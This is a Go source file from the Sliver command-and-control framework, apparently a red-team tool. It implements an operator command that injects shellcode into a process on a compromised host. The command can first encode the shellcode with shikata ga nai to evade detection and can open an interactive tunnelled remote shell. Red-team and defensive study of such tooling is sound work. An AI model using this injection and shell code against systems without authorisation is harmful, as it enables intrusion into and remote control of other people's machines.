package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"os"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"golang.org/x/term"
	"google.golang.org/protobuf/proto"
)

// ExecuteShellcodeCmd - Execute shellcode in-memory.
func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	rwxPages, _ := cmd.Flags().GetBool("rwx-pages")
	interactive, _ := cmd.Flags().GetBool("interactive")
	if interactive && beacon != nil {
		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
		return
	}

	pid, _ := cmd.Flags().GetUint32("pid")
	shellcodePath := args[0]
	shellcodeBin, err := os.ReadFile(shellcodePath)
	if err != nil {
		con.PrintErrorf("%s\n", err.Error())
		return
	}
	if pid != 0 && interactive {
		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
		return
	}
	shikataGaNai, _ := cmd.Flags().GetBool("shikata-ga-nai")
	if shikataGaNai {
		if !rwxPages {
			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
			return
		}
		arch, _ := cmd.Flags().GetString("architecture")
		if arch != "386" && arch != "amd64" {
			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
			return
		}
		iter, _ := cmd.Flags().GetUint32("iterations")
		con.PrintInfof("Encoding shellcode ...\n")
		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
			Architecture: arch,
			Iterations:   iter,
			BadChars:     []byte{},
			Data:         shellcodeBin,
		})
		if err != nil {
			con.PrintErrorf("%s\n", con.UnwrapServerErr(err))
			return
		}
		oldSize := len(shellcodeBin)
		shellcodeBin = resp.GetData()
		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
	}

	process, _ := cmd.Flags().GetString("process")

	if interactive {
		executeInteractive(cmd, process, shellcodeBin, rwxPages, con)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	con.SpinUntil(msg, ctrl)
	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: rwxPages,
		Pid:      pid,
		Request:  con.ActiveTarget.Request(cmd),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", con.UnwrapServerErr(err))
		return
	}

	if shellcodeTask.Response != nil && shellcodeTask.Response.Async {
		con.AddBeaconCallback(shellcodeTask.Response, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, shellcodeTask)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintExecuteShellcode(shellcodeTask, con)
		})
	} else {
		PrintExecuteShellcode(shellcodeTask, con)
	}
}

// PrintExecuteShellcode - Display result of shellcode execution.
func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverClient) {
	if task.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", task.Response.GetErr())
	} else {
		con.PrintInfof("Executed shellcode on target\n")
	}
}

func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverClient) {
	// Check active session
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	// Start remote process and tunnel
	noPty := false
	if session.GetOS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", con.UnwrapServerErr(err))
		return
	}

	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", con.UnwrapServerErr(err))
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
		Request:  con.ActiveTarget.Request(cmd),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("%s\n", con.UnwrapServerErr(err))
		return
	}

	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *term.State
	if !noPty {
		oldState, err = term.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			con.PrintErrorf("Failed to save terminal state\n")
			return
		}
	}

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			con.PrintErrorf("Error writing to stdout: %v", err)
			return
		}
	}()
	for {
		log.Printf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		log.Printf("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			con.PrintErrorf("Error reading from stdin: %v", err)
			break
		}
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		term.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}
